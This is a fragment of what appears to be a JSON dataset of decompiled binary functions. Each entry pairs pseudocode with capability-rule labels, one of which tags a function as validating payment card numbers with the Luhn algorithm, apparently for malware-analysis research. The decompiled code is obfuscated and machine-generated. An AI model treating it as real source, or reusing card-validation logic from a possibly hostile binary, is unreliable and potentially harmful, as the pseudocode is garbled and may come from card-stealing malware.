+ -1;\n                        in_XMM6 = minps(in_XMM6, *(extraout_ECX_03 + -0x42));\n                        piVar6 = extraout_ECX_03;\n                        puVar10 = puVar9;\ncode_r0x00402e08:\n                        puVar1 = uVar5 + 0x4ead92c3;\n                        uVar3 = piVar6 & 7;\n                        *puVar1 = *puVar1 << uVar3 | *puVar1 >> 8 - uVar3;\n                        LOCK();\n                        puVar9 = puVar10;\n                        if (var_10h ==\n                            (uVar5 & 0xffff0000 |\n                            CONCAT11(((uVar5 >> 8) - *(CONCAT31(Var8, 0x72) + 0x45898685)) -\n                                     ((piVar6 & 0x1f) != 0 && (*puVar1 & 1) != 0), uVar5))) goto code_r0x00402e77;\n                    }\n                }\n            } while( true );\n        }\n    }\n    return uVar14;\ncode_r0x00402f48:\n    in_XMM6 = minps(in_XMM6, *(piVar6 + -0x42));\n    puVar1 = uVar5 + 0x4ead92c3;\n    uVar3 = piVar6 & 7;\n    *puVar1 = *puVar1 << uVar3 | *puVar1 >> 8 - uVar3;\n    LOCK();\n    if ((var_10h & 1) != 0) {\n        return 6;\n    }\n    goto code_r0x00402d3d;\n}\n",
        "token_count": 5937
    },
    "00403107": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00403107(void)\n\n{\n    uint arg_8h;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    \n    fcn.00401baf(&var_20h, 0x40428e, 0x10);\n    arg_8h = fcn.00401a13();\n    fcn.0040314e(arg_8h, &var_20h);\n    return;\n}\n",
        "token_count": 103
    }
}